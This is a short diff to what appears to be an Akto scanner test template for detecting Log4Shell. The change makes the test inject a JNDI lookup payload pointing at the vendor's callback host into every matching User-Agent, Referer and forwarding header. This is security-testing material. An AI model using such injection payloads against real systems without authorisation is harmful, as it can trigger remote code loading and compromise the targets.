@@ -76,7 +76,7 @@ api_selection_filters:
     for_one:
       key:
         regex: "^user-agent$|^User-Agent$|^referer$|^Referer$|orward"
-        extract: headerKey
+        extractMultiple: headerKey
 
 execute:
   type: single
@@ -85,7 +85,8 @@ execute:
         - send_ssrf_req:
             url: "https://test-services.akto.io/store_uuid/3523ddf7-51ef-462b-a452-f33246aae6bb"
         - modify_header:
-            headerKey: "${jndi1}{jndi:https://test-services.akto.io/3523ddf7-51ef-462b-a452-f33246aae6bb}"
+            ${headerKey}: "${jndi1}{jndi:https://test-services.akto.io/3523ddf7-51ef-462b-a452-f33246aae6bb}"
+          for_each_combination: true
 validate:
   response_payload:
     length:
